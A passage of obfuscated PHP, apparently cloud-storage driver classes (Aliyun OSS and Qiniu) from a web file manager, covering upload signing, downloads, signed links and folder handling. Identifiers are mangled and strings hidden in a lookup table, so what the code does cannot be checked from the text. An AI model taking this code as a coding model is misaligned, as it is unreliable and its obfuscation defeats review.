$this->client->multiuploadFile($this->bucket, $this->pathEncode($E·©Ï°÷œÆ), $câÑœŸ©, $CíœÌ›à‘Ÿ); } catch (OSS\Core\OssException $C„š†œ¿ë) { return !1; } return $this->getPathOuter($Cª’ÉÉˆ÷§); } public function getHost() { $fÕ‚˜«Ôæ” =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÅá¢œ‡ = explode($fÕ‚˜«Ôæ”[177], parent::getHost()); return $eÅá¢œ‡[0] . $fÕ‚˜«Ôæ”[177] . $this->bucket . $fÕ‚˜«Ôæ”[94] . $eÅá¢œ‡[1]; } public function uploadFormData($DÃ™æÆ˜ºÕ, $A†–Ì†İ›Ğ = 3600) { goto d—â—¦ß˜·; EŒ›Úøáñ: $fí¸æ„†œ = strpos($bœìÅ­íÓŸ, $EÀ¬ï†ùÓ›[292]); $bœìÅ­íÓŸ = substr($bœìÅ­íÓŸ, 0, $fí¸æ„†œ) . $EÀ¬ï†ùÓ›[1242]; $bğ‘ªÀ˜º— = 1048576000 * 5; goto fâ²ÊÏö’’; D±¤³ª†Œ: $a”ÀÏİ½‘ë = date($EÀ¬ï†ùÓ›[1241], time() + $DÒˆ‘ğò•); $D£–¬ÖÅ˜ = new DateTime($a”ÀÏİ½‘ë); $bœìÅ­íÓŸ = $D£–¬ÖÅ˜->format(DateTime::ISO8601); goto EŒ›Úøáñ; bâË´ä½Ü›: return $bå³¨‘­íÀ; goto B ¦Ê—îğ; d—â—¦ß˜·: $EÀ¬ï†ùÓ› =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!($bŒğËæ¿³ = $this->getHost())) { return !1; } $DÒˆ‘ğò• = $A†–Ì†İ›Ğ; goto D±¤³ª†Œ; fâ²ÊÏö’’: $e®Ìî­‚ß = $this->pathFather($DÃ™æÆ˜ºÕ); $aËæõÈÍ÷í = array($EÀ¬ï†ùÓ›[1139] => $bœìÅ­íÓŸ, $EÀ¬ï†ùÓ›[1140] => array(array($EÀ¬ï†ùÓ›[1243], 0, $bğ‘ªÀ˜º—), array($EÀ¬ï†ùÓ›[1143], $EÀ¬ï†ùÓ›[1144], $e®Ìî­‚ß))); $dÑâ”ƒ–‰ˆ = base64_encode(json_encode($aËæõÈÍ÷í)); goto AÁ¨˜ŒÕ¹É; AÁ¨˜ŒÕ¹É: $CÍÇáÅŠ˜ = base64_encode(hash_hmac($EÀ¬ï†ùÓ›[228], $dÑâ”ƒ–‰ˆ, $this->secret, !0)); $bå³¨‘­íÀ = array($EÀ¬ï†ùÓ›[1149] => $dÑâ”ƒ–‰ˆ, $EÀ¬ï†ùÓ›[1244] => $this->accessKey, $EÀ¬ï†ùÓ›[1145] => $EÀ¬ï†ùÓ›[1137], $EÀ¬ï†ùÓ›[1245] => $CÍÇáÅŠ˜, $EÀ¬ï†ùÓ›[175] => $bŒğËæ¿³); $bå³¨‘­íÀ = $this->trafficLimit($EÀ¬ï†ùÓ›[1238], $bå³¨‘­íÀ); goto bâË´ä½Ü›; B ¦Ê—îğ: } public function multiUploadFormData($bÌİé˜÷¡Í, $dÜ—šÚºØŠ = 3600) { $BªÙÆ¥ê¶Ñ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!($e¤Ô¨Ñ£‡Ñ = $this->getHost())) { return !1; } $DÌ¢´êìì  = $this->trafficLimit($BªÙÆ¥ê¶Ñ[1238]); $CÍÏÑß÷Åà = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bÌİé˜÷¡Í), $DÌ¢´êìì ); return array($BªÙÆ¥ê¶Ñ[219] => $CÍÏÑß÷Åà, $BªÙÆ¥ê¶Ñ[175] => $e¤Ô¨Ñ£‡Ñ . $BªÙÆ¥ê¶Ñ[8] . $this->pathEncode($bÌİé˜÷¡Í), $BªÙÆ¥ê¶Ñ[220] => gmdate($BªÙÆ¥ê¶Ñ[1246]), $BªÙÆ¥ê¶Ñ[92] => $bÌİé˜÷¡Í); } public function multiUploadAuthData($aÃÛ¬’ù‡, $dëíİòÆÍÌ = array()) { goto a¶ ÄàÕİ…; fåÅ†£ï—¶: $aÊòË¶† = array($E²èÖ¥çœ[222], $E²èÖ¥çœ[33], $E²èÖ¥çœ[118], $d¯Š­­æ™Í, "\170\55\x6f\163\x73\55\x64\x61\x74\x65\x3a{$d¯Š­­æ™Í}", $E²èÖ¥çœ[8] . $this->bucket . $E²èÖ¥çœ[8] . $DÏŒÊßå½ . $B…ßîòµ); if (strpos($B…ßîòµ, $E²èÖ¥çœ[223]) === 0) { $aÊòË¶†[0] = $E²èÖ¥çœ[224]; if ($BÖê»¾éˆ‰ = $this->trafficLimit($E²èÖ¥çœ[1238])) { $DÏŒÊßå½ = $E²èÖ¥çœ[1247]; array_splice($aÊòË¶†, 5, 0, $DÏŒÊßå½ . $E²èÖ¥çœ[4] . $BÖê»¾éˆ‰[$DÏŒÊßå½]); } } if (isset($dëíİòÆÍÌ[$E²èÖ¥çœ[225]]) && $dëíİòÆÍÌ[$E²èÖ¥çœ[225]] == $E²èÖ¥çœ[226]) { $aÊòË¶†[0] = $E²èÖ¥çœ[226]; } goto eÛ¡‰Å²öä; eÛ¡‰Å²öä: if (!empty($dëíİòÆÍÌ[$E²èÖ¥çœ[1248]])) { $FÓŞæ°Œ³­ = array_merge(array($aÊòË¶†[4]), $dëíİòÆÍÌ[$E²èÖ¥çœ[1248]]); sort($FÓŞæ°Œ³­); $aÊòË¶†[4] = implode($E²èÖ¥çœ[227], $FÓŞæ°Œ³­); } $fÂ«®ê¹‚¥ = implode($E²èÖ¥çœ[227], $aÊòË¶†); $Fá¼„„ùÂ­ = base64_encode(hash_hmac($E²èÖ¥çœ[228], $fÂ«®ê¹‚¥, $this->secret, !0)); goto aŒ¸ÌˆÅëÂ; C±©Å“È: $DÏŒÊßå½ = $aÃÛ¬’ù‡; if (isset($dëíİòÆÍÌ[$E²èÖ¥çœ[92]])) { $DÏŒÊßå½ = $dëíİòÆÍÌ[$E²èÖ¥çœ[92]]; unset($dëíİòÆÍÌ[$E²èÖ¥çœ[92]]); } if (isset($dëíİòÆÍÌ[$E²èÖ¥çœ[221]])) { $dëíİòÆÍÌ[$E²èÖ¥çœ[220]] = $d¯Š­­æ™Í; return $this->listUploadParts($DÏŒÊßå½, $dëíİòÆÍÌ); } goto fåÅ†£ï—¶; aŒ¸ÌˆÅëÂ: $eù®ç­ÛÓî = $E²èÖ¥çœ[1211] . $this->accessKey . $E²èÖ¥çœ[4] . $Fá¼„„ùÂ­; if (strpos($B…ßîòµ, $E²èÖ¥çœ[223]) === 0) { $eù®ç­ÛÓî = array($E²èÖ¥çœ[230] => $eù®ç­ÛÓî, $E²èÖ¥çœ[220] => $d¯Š­­æ™Í); if ($BÖê»¾éˆ‰) { $eù®ç­ÛÓî = array_merge($eù®ç­ÛÓî, $BÖê»¾éˆ‰); } } return $eù®ç­ÛÓî; goto fÅøŒÂê½ñ; a¶ ÄàÕİ…: $E²èÖ¥çœ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d¯Š­­æ™Í = isset($dëíİòÆÍÌ[$E²èÖ¥çœ[220]]) ? $dëíİòÆÍÌ[$E²èÖ¥çœ[220]] : gmdate($E²èÖ¥çœ[1246]); $B…ßîòµ = isset($dëíİòÆÍÌ[$E²èÖ¥çœ[167]]) ? $dëíİòÆÍÌ[$E²èÖ¥çœ[167]] : $E²èÖ¥çœ[33]; goto C±©Å“È; fÅøŒÂê½ñ: } public function listUploadParts($FñäŒ‘äÚ¯, $bí›¶¬å¯¸) { goto fªœÊ†Ñ™; fªœÊ†Ñ™: $dÖŠíĞŒØ’ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aŠ¢¸Êç¸Š = parse_url_query($bí›¶¬å¯¸[$dÖŠíĞŒØ’[167]]); $cŠ¨Šá = $this->client->listParts($this->bucket, $this->pathEncode($FñäŒ‘äÚ¯), $aŠ¢¸Êç¸Š[$dÖŠíĞŒØ’[219]]); goto d†Ô°¢‚ô˜; aÂ£í™¥: unset($bí›¶¬å¯¸[$dÖŠíĞŒØ’[221]], $bí›¶¬å¯¸[$dÖŠíĞŒØ’[225]]); $f˜ø‡ÃÈø— = $this->multiUploadAuthData($FñäŒ‘äÚ¯, $bí›¶¬å¯¸); if (empty($f˜ø‡ÃÈø—)) { return !1; } goto F½ï‹…±÷®; F½ï‹…±÷®: return array($dÖŠíĞŒØ’[230] => $f˜ø‡ÃÈø—, $dÖŠíĞŒØ’[220] => $bí›¶¬å¯¸[$dÖŠíĞŒØ’[220]], $dÖŠíĞŒØ’[232] => $fèõ…ğ‘²); goto E‹Š’õäì¬; d†Ô°¢‚ô˜: $eô‰ÒçèÊ = $cŠ¨Šá->getListPart(); $fèõ…ğ‘² = array(); foreach ($eô‰ÒçèÊ as $E”áÄë™—Ï) { $fèõ…ğ‘²[] = array($dÖŠíĞŒØ’[1231] => $E”áÄë™—Ï->getPartNumber(), $dÖŠíĞŒØ’[1232] => trim($E”áÄë™—Ï->getETag(), $dÖŠíĞŒØ’[115])); } goto aÂ£í™¥; E‹Š’õäì¬: } public function download($cõã²ùñ £, $DÍ—ƒš§×§) { if ($this->isFolder($cõã²ùñ £)) { return !1; } try { $a™×¬ôÑŠ… = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $DÍ—ƒš§×§); $a™×¬ôÑŠ… = $this->trafficLimit($_SERVER[ó¬â¥‰ÊÔ¤Ç£][108], $a™×¬ôÑŠ…); $this->client->getObject($this->bucket, $this->pathEncode($cõã²ùñ £), $a™×¬ôÑŠ…); } catch (OSS\Core\OssException $E±èÓÄ÷àĞ) { return !1; } return $DÍ—ƒš§×§; } public function fileSubstr($aÙÊŸÄğæ§, $FÆÍ¡™¯‡ = 0, $a‰±¤ÔåŠŸ = false) { if ($FÆÍ¡™¯‡ === -1) { $fÊëÂ¯é™ = array(); } else { if ($a‰±¤ÔåŠŸ === !1) { $BÀ•·Æã¤ = $this->size($aÙÊŸÄğæ§); } else { $BÀ•·Æã¤ = $FÆÍ¡™¯‡ + $a‰±¤ÔåŠŸ - 1; } $fÊëÂ¯é™ = array(OSS\OssClient::OSS_RANGE => "{$FÆÍ¡™¯‡}\x2d{$BÀ•·Æã¤}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($aÙÊŸÄğæ§), $fÊëÂ¯é™); } catch (OSS\Core\OssException $cğÖ¯í¢º) { think_exception($cğÖ¯í¢º->getMessage()); return !1; } } private function trafficLimit($fé²İºÎ‘, $eÉµÔÕÁ» = array()) { goto a²¶Ëœ¤ƒÖ; a²¶Ëœ¤ƒÖ: $EÌ½ò”Êé¢ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($fé²İºÎ‘ == $EÌ½ò”Êé¢[1238] && $this->isUploadServer() || $fé²İºÎ‘ == $EÌ½ò”Êé¢[108] && $this->isFileOutServer()) { return $eÉµÔÕÁ»; } $cƒ³ë­¿–ç = floatval($GLOBALS[$EÌ½ò”Êé¢[6]][$EÌ½ò”Êé¢[87]][$EÌ½ò”Êé¢[106]][$fé²İºÎ‘]) * 1024 * 1024 * 8; goto b‰Íò·¿Ô“; b‰Íò·¿Ô“: if (!$cƒ³ë­¿–ç) { return $eÉµÔÕÁ»; } $cƒ³ë­¿–ç = $cƒ³ë­¿–ç < 819200 ? 819200 : ($cƒ³ë­¿–ç > 838860800 ? 838860800 : $cƒ³ë­¿–ç); $eÉµÔÕÁ»[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($cƒ³ë­¿–ç); goto a“†Ø™ÑÚ·; a“†Ø™ÑÚ·: return $eÉµÔÕÁ»; goto F‘©Á›‚ò; F‘©Á›‚ò: } public function link($dÌùÄ‹‚Õ, $BÖŸŠœàß² = array()) { $fŒ‘Šë´˜Ñ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->exist($dÌùÄ‹‚Õ) || $this->isFolder($dÌùÄ‹‚Õ)) { return !1; } try { $BÖŸŠœàß² = $this->trafficLimit($fŒ‘Šë´˜Ñ[108], $BÖŸŠœàß²); $e®¯…×ÙÖª = $this->client->signUrl($this->bucket, $this->pathEncode($dÌùÄ‹‚Õ), 3600 * 12, $fŒ‘Šë´˜Ñ[226], $BÖŸŠœàß²); return $this->getCdnLink($e®¯…×ÙÖª); } catch (OSS\Core\OssException $eÃ÷’‰ƒÀŠ) { return !1; } } public function fileOut($D‚Ñ–Ì­‚, $c®±£‘Ë = false, $c¡ÏÈ¹ŠÃ˜ = false, $AÛ¤·ôùï = '') { goto Aî‚ŠÊÛÂ÷; B£œ’šÖ©Ì: $c¡ÏÈ¹ŠÃ˜ = rawurlencode($c¡ÏÈ¹ŠÃ˜); $D…§ƒó‹Ô = get_file_mime(get_path_ext($c¡ÏÈ¹ŠÃ˜)); if ($D…§ƒó‹Ô == $eŒ±½Ïá§[211]) { return parent::fileOut($D‚Ñ–Ì­‚, $c®±£‘Ë, $c¡ÏÈ¹ŠÃ˜, $AÛ¤·ôùï); } goto A‡¸Í¡ÌêŸ; fê®¢ŒæŸê: $b¶ºÙÖª¶Ş = $this->link($D‚Ñ–Ì­‚, $dãĞ×«ãáì); $this->fileOutLink($b¶ºÙÖª¶Ş); goto EŒ‡æáÀÇø; Aî‚ŠÊÛÂ÷: $eŒ±½Ïá§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->isFileOutServer()) { return $this->fileOutServer($D‚Ñ–Ì­‚, $c®±£‘Ë, $c¡ÏÈ¹ŠÃ˜, $AÛ¤·ôùï); } if (!$c¡ÏÈ¹ŠÃ˜) { $c¡ÏÈ¹ŠÃ˜ = $this->pathThis($D‚Ñ–Ì­‚); } goto B£œ’šÖ©Ì; A‡¸Í¡ÌêŸ: $c®±£‘Ë = $c®±£‘Ë ? $eŒ±½Ïá§[212] : $eŒ±½Ïá§[213]; $dãĞ×«ãáì = array(OSS\OssClient::OSS_SUB_RESOURCE => $eŒ±½Ïá§[1249] . rawurlencode("{$c®±£‘Ë}\73\146\151\x6c\x65\156\141\x6d\x65\75{$c¡ÏÈ¹ŠÃ˜}")); $dãĞ×«ãáì[OSS\OssClient::OSS_SUB_RESOURCE] .= $eŒ±½Ïá§[1250] . rawurlencode($D…§ƒó‹Ô); goto fê®¢ŒæŸê; EŒ‡æáÀÇø: } public function fileOutServer($d¾”§çùò, $BàÓÑ‹±ò÷ = false, $fù…™ïÂøä = false, $D¹’èèÈ¬ª = '') { parent::fileOut($d¾”§çùò, $BàÓÑ‹±ò÷, $fù…™ïÂøä, $D¹’èèÈ¬ª); } public function fileOutImage($aÜõğŠåîà, $câƒà³¿Š = 250) { $FÜËŒøãÚ– = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1251] . $câƒà³¿Š); $c‹‡–¡¹á£ = $this->link($aÜõğŠåîà, $FÜËŒøãÚ–); $this->fileOutLink($c‹‡–¡¹á£); } public function fileOutImageServer($EçÅêöÁô, $Cë“³·¸–ä = 250) { parent::fileOutImage($EçÅêöÁô, $Cë“³·¸–ä); } public function fileOutLink($e”ğÃ Ã”) { $bôàŒ»³¹‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->isCdnHost() && substr($e”ğÃ Ã”, 0, 7) == $bôàŒ»³¹‰[1152]) { $e”ğÃ Ã” = $bôàŒ»³¹‰[1153] . substr($e”ğÃ Ã”, 7); } header($bôàŒ»³¹‰[158] . $e”ğÃ Ã”); die; } public function hashMd5($E‚ÖÜÇ¤©¯, $DŠÎ«ŠÄšó = '') { $dñæ©ïŸ¿Ü =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D‡ª­÷“¼ƒ = $this->_objectMeta($E‚ÖÜÇ¤©¯); if (!$D‡ª­÷“¼ƒ) { return $dñæ©ïŸ¿Ü[33]; } if (!isset($D‡ª­÷“¼ƒ[$dñæ©ïŸ¿Ü[1227]]) && !empty($DŠÎ«ŠÄšó)) { $EÅö›ã³Ù¶ = $this->updateObjMeta($E‚ÖÜÇ¤©¯, array($dñæ©ïŸ¿Ü[1227] => $DŠÎ«ŠÄšó)); $D‡ª­÷“¼ƒ[$dñæ©ïŸ¿Ü[1227]] = $EÅö›ã³Ù¶ ? $DŠÎ«ŠÄšó : $dñæ©ïŸ¿Ü[33]; } return isset($D‡ª­÷“¼ƒ[$dñæ©ïŸ¿Ü[1227]]) ? strtolower($D‡ª­÷“¼ƒ[$dñæ©ïŸ¿Ü[1227]]) : $dñæ©ïŸ¿Ü[33]; } public function size($CÙ©Úè™©÷) { $dì¬Õî¤Ñ† = $this->objectMeta($CÙ©Úè™©÷); return $dì¬Õî¤Ñ† ? $dì¬Õî¤Ñ†[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]] : 0; } public function info($d¤ÛŒæÉö) { if ($this->isFolder($d¤ÛŒæÉö)) { return $this->folderInfo($d¤ÛŒæÉö); } else { if ($this->isFile($d¤ÛŒæÉö)) { return $this->fileInfo($d¤ÛŒæÉö); } } return !1; } public function exist($fÜù·íò“) { return $this->isFile($fÜù·íò“) || $this->isFolder($fÜù·íò“); } public function isFile($fáµ‘Æó±¯) { return !$this->isFolder($fáµ‘Æó±¯) && $this->objectMeta($fáµ‘Æó±¯); } public function isFolder($B¢Æ•¬Ş×) { return $this->cacheMethod($_SERVER[ó¬â¥‰ÊÔ¤Ç£][197], $B¢Æ•¬Ş×); } protected function objectMeta($cŞ˜©Š…²Ğ) { return $this->cacheMethod($_SERVER[ó¬â¥‰ÊÔ¤Ç£][198], $cŞ˜©Š…²Ğ); } protected function _objectMeta($A½„öÏõ³) { $EÎ·©Õí¹ˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; try { $BÅŞ©‘ˆ¯¹ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($A½„öÏõ³)); } catch (OSS\Core\OssException $F—†šíø…Ã) { $BÅŞ©‘ˆ¯¹ = !1; } if ($BÅŞ©‘ˆ¯¹) { $BÅŞ©‘ˆ¯¹[$EÎ·©Õí¹ˆ[77]] = intval($BÅŞ©‘ˆ¯¹[$EÎ·©Õí¹ˆ[1225]]); } return $BÅŞ©‘ˆ¯¹; } protected function _isFolder($B’”ìËÇ¬) { $B¿ñÆÖ× ¤ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($B’”ìËÇ¬ == $B¿ñÆÖ× ¤[33] || $B’”ìËÇ¬ == $B¿ñÆÖ× ¤[8]) { return !0; } $f„†¤´¢¬ = array($B¿ñÆÖ× ¤[1221] => $B¿ñÆÖ× ¤[8], $B¿ñÆÖ× ¤[1222] => rtrim($B’”ìËÇ¬, $B¿ñÆÖ× ¤[8]) . $B¿ñÆÖ× ¤[8], $B¿ñÆÖ× ¤[1223] => 1, $B¿ñÆÖ× ¤[1224] => $B¿ñÆÖ× ¤[33]); $d™µŠªİáè = $this->client->listObjects($this->bucket, $f„†¤´¢¬); if ($d™µŠªİáè->getObjectList() || $d™µŠªİáè->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($cÃìÂóÓÜ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1252]; $this->_init($cÃìÂóÓÜ); } public function _init($BíÑ‡Û´ç‘) { goto Ešø·Ğ›ßŒ; c¤ÏÙóä›µ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto cÌ›íÁË¡; cÌ›íÁË¡: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto bè›¦‡ƒ»; Ešø·Ğ›ßŒ: $a±ß›…’Ö× =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; foreach ($BíÑ‡Û´ç‘ as $DŒñ¡ˆËé´ => $F“É‡·çù) { if (isset($this->{$DŒñ¡ˆËé´})) { $this->{$DŒñ¡ˆËé´} = $F“É‡·çù; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($a±ß›…’Ö×[1253] . LNG($a±ß›…’Ö×[1212])); } goto c¤ÏÙóä›µ; bè›¦‡ƒ»: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($bİ¼â·Û…, $Fƒ”ùÇÂô÷ = '', $bŸèî¥ÇÌé = REPEAT_RENAME) { if ($this->setContent($bİ¼â·Û…, $Fƒ”ùÇÂô÷)) { return $this->getPathOuter($bİ¼â·Û…); } return !1; } public function mkdir($f¿‰å¬óÏá, $A¾ÚÑåŒŒÕ = REPEAT_SKIP) { goto f„³£Ğ¿ó–; FÃ¨´áŒŒ°: if (!$this->mkfile($Fçé²‹İ÷÷)) { return !1; } if (!$this->moveFile($Fçé²‹İ÷÷, $f¿‰å¬óÏá)) { $this->delFile($Fçé²‹İ÷÷); return !1; } return $this->getPathOuter($EóØ±µàñá); goto C¿×Å¥³°; fÖ´‰¹„Ã: $f¿‰å¬óÏá = $EóØ±µàñá . $AÈ–É¬±¥Ö[8]; $D¿âî¥ÙŞè = get_path_this($EóØ±µàñá); $Fçé²‹İ÷÷ = $f¿‰å¬óÏá . $D¿âî¥ÙŞè; goto FÃ¨´áŒŒ°; f„³£Ğ¿ó–: $AÈ–É¬±¥Ö =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EóØ±µàñá = trim($f¿‰å¬óÏá, $AÈ–É¬±¥Ö[8]); if ($this->_isFolder($EóØ±µàñá)) { return $this->getPathOuter($EóØ±µàñá); } goto fÖ´‰¹„Ã; C¿×Å¥³°: } public function copyFile($aÑñ™•À˜, $d¦¢Ä¸ó±Á) { $aÂâˆèï™³ = $this->bucketManager->copy($this->bucket, $aÑñ™•À˜, $this->bucket, $d¦¢Ä¸ó±Á, !0); return $aÂâˆèï™³ ? !1 : $this->getPathOuter($d¦¢Ä¸ó±Á); } public function moveFile($b¢‘ªĞŒ¥í, $a”“…£ÅØ) { $eÌ÷×ñÁÑ = $this->bucketManager->move($this->bucket, $b¢‘ªĞŒ¥í, $this->bucket, $a”“…£ÅØ, !0); return $eÌ÷×ñÁÑ ? !1 : $this->getPathOuter($a”“…£ÅØ); } public function delFile($eÒÁ¿“íŞ±) { if (!$this->exist($eÒÁ¿“íŞ±)) { return !0; } $CÛŞÁä©ôÃ = $this->bucketManager->delete($this->bucket, $eÒÁ¿“íŞ±); return $CÛŞÁä©ôÃ ? !1 : !0; } public function delFolder($EŒÚÜ©¬õó) { goto aÊ‰òÙ‚Ã; FƒæŸ±ø: $FèãƒóŸ‚ = $this->fileList($EŒÚÜ©¬õó); $this->listItemCache = !0; $eŠÃÚª×« = trim($EŒÚÜ©¬õó, $B•©¬–á•[8]) . $B•©¬–á•[8]; goto F·ƒ¹îèêÕ; F·ƒ¹îèêÕ: if (!empty($EŒÚÜ©¬õó) && !in_array($eŠÃÚª×«, $FèãƒóŸ‚[$B•©¬–á•[74]])) { $FèãƒóŸ‚[$B•©¬–á•[74]][] = $eŠÃÚª×«; } $f¯ë£¢…•“ = $this->delByBatch($FèãƒóŸ‚[$B•©¬–á•[73]]); if (!$f¯ë£¢…•“) { return !1; } goto C¥Ùµ…åå¢; C¥Ùµ…åå¢: return $this->delByBatch($FèãƒóŸ‚[$B•©¬–á•[74]]); goto Déã¾ÜŠâ; aÊ‰òÙ‚Ã: $B•©¬–á• =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->exist($EŒÚÜ©¬õó)) { return !0; } $this->listItemCache = !1; goto FƒæŸ±ø; Déã¾ÜŠâ: } private function delByBatch($EÒñ¥Ç÷´‡) { foreach (array_chunk($EÒñ¥Ç÷´‡, 1000) as $eŒâ•ê¿ˆç) { $D·¿î«™ÇÄ = $this->bucketManager->buildBatchDelete($this->bucket, $eŒâ•ê¿ˆç); list($aåğ†ãêå, $eèÕËÂ£Á„) = $this->bucketManager->batch($D·¿î«™ÇÄ); if ($eèÕËÂ£Á„) { return !1; } } return !0; } public function rename($DªÜª¨Å†à, $bõ¬Ö§ª–…) { return $this->renameObject($DªÜª¨Å†à, $bõ¬Ö§ª–…); } public function fileInfo($D±ÚƒÓªÅÕ, $b˜»±ÏÎâç = false, $EÀŞÙåªêì = array()) { goto AÜù×ËŠ™ß; Bˆåœ‡ÜÇ: if (isset($EÀŞÙåªêì[$E¢§˜÷‰æ[1255]])) { $DÃíÔÖğ‹ô[$E¢§˜÷‰æ[83]] = substr($EÀŞÙåªêì[$E¢§˜÷‰æ[1255]] . $E¢§˜÷‰æ[33], 0, 10); } if (isset($EÀŞÙåªêì[$E¢§˜÷‰æ[1254]])) { $DÃíÔÖğ‹ô[$E¢§˜÷‰æ[77]] = $EÀŞÙåªêì[$E¢§˜÷‰æ[1254]]; } return $DÃíÔÖğ‹ô; goto f©•Àµ¬°—; AĞ–à‹°”¨: $DÃíÔÖğ‹ô[$E¢§˜÷‰æ[192]] = $DÃíÔÖğ‹ô[$E¢§˜÷‰æ[83]] = 0; $DÃíÔÖğ‹ô[$E¢§˜÷‰æ[193]] = $DÃíÔÖğ‹ô[$E¢§˜÷‰æ[194]] = !0; if (empty($EÀŞÙåªêì)) { $EÀŞÙåªêì = $this->objectMeta($D±ÚƒÓªÅÕ); if (!$EÀŞÙåªêì) { return $DÃíÔÖğ‹ô; } } goto Bˆåœ‡ÜÇ; AÜù×ËŠ™ß: $E¢§˜÷‰æ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÃíÔÖğ‹ô = array($E¢§˜÷‰æ[28] => $this->pathThis($D±ÚƒÓªÅÕ), $E¢§˜÷‰æ[75] => $this->getPathOuter($E¢§˜÷‰æ[8] . $D±ÚƒÓªÅÕ), $E¢§˜÷‰æ[29] => $E¢§˜÷‰æ[173], $E¢§˜÷‰æ[77] => isset($EÀŞÙåªêì[$E¢§˜÷‰æ[1254]]) ? $EÀŞÙåªêì[$E¢§˜÷‰æ[1254]] : 0, $E¢§˜÷‰æ[167] => $this->ext($D±ÚƒÓªÅÕ)); if ($b˜»±ÏÎâç) { return $DÃíÔÖğ‹ô; } goto AĞ–à‹°”¨; f©•Àµ¬°—: } public function folderInfo($d–Î¤ŒßöÍ, $C«©âÜó = false) { goto bœêÀ—ˆ¡; CÆ¡‹ğØÂˆ: $DØœ¹Ãíˆ = $this->objectMeta($d–Î¤ŒßöÍ); if (isset($DØœ¹Ãíˆ[$e¾íˆŠ‘ğÁ[1255]])) { $b¼Ú”Î‡[$e¾íˆŠ‘ğÁ[83]] = substr($DØœ¹Ãíˆ[$e¾íˆŠ‘ğÁ[1255]] . $e¾íˆŠ‘ğÁ[33], 0, 10); } return $b¼Ú”Î‡; goto f «¥ÔÖÙ·; EÕé˜’Ñ¨: $b¼Ú”Î‡[$e¾íˆŠ‘ğÁ[192]] = $b¼Ú”Î‡[$e¾íˆŠ‘ğÁ[83]] = 0; $b¼Ú”Î‡[$e¾íˆŠ‘ğÁ[193]] = $b¼Ú”Î‡[$e¾íˆŠ‘ğÁ[194]] = !0; $d–Î¤ŒßöÍ = rtrim($d–Î¤ŒßöÍ, $e¾íˆŠ‘ğÁ[8]) . $e¾íˆŠ‘ğÁ[8]; goto CÆ¡‹ğØÂˆ; bœêÀ—ˆ¡: $e¾íˆŠ‘ğÁ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b¼Ú”Î‡ = array($e¾íˆŠ‘ğÁ[28] => $this->pathThis($d–Î¤ŒßöÍ), $e¾íˆŠ‘ğÁ[75] => $this->getPathOuter($e¾íˆŠ‘ğÁ[8] . $d–Î¤ŒßöÍ), $e¾íˆŠ‘ğÁ[29] => $e¾íˆŠ‘ğÁ[76]); if ($C«©âÜó) { return $b¼Ú”Î‡; } goto EÕé˜’Ñ¨; f «¥ÔÖÙ·: } public function listPath($eŒš‘¬, $d„àæŞß®± = false) { $eêÏƒÙ»„™ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c±ˆ„šÔñ³ = $this->fileList($eŒš‘¬, $eêÏƒÙ»„™[8], !0); foreach ($c±ˆ„šÔñ³[$eêÏƒÙ»„™[74]] as $B±•¼Ê”ßÙ => $dñŸª£İ) { $c±ˆ„šÔñ³[$eêÏƒÙ»„™[74]][$B±•¼Ê”ßÙ] = $this->folderInfo($dñŸª£İ, $d„àæŞß®±); } foreach ($c±ˆ„šÔñ³[$eêÏƒÙ»„™[73]] as $B±•¼Ê”ßÙ => $dñŸª£İ) { $c±ˆ„šÔñ³[$eêÏƒÙ»„™[73]][$B±•¼Ê”ßÙ] = $this->fileInfo($dñŸª£İ[$eêÏƒÙ»„™[92]], $d„àæŞß®±, $dñŸª£İ); } return $c±ˆ„šÔñ³; } public function has($FÓ¬×¬‡¢´, $A¶ÎˆÀ‘î = false, $f¸Ã ¥š·¯ = true) { goto CîÉ“È©; d÷éáÇ×»‚: $b½¢‚Íê© = $aˆß²ğ•îÁ[33]; $a¿¯Ô•ÉÒï = 500; $a‘Â­‡¥à = $aˆß²ğ•îÁ[8]; goto c¢¯µô©à ; CîÉ“È©: $aˆß²ğ•îÁ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FÓ¬×¬‡¢´ = trim($FÓ¬×¬‡¢´, $aˆß²ğ•îÁ[8]); $Bˆºè”øã» = empty($FÓ¬×¬‡¢´) ? $aˆß²ğ•îÁ[33] : $FÓ¬×¬‡¢´ . $aˆß²ğ•îÁ[8]; goto d÷éáÇ×»‚; 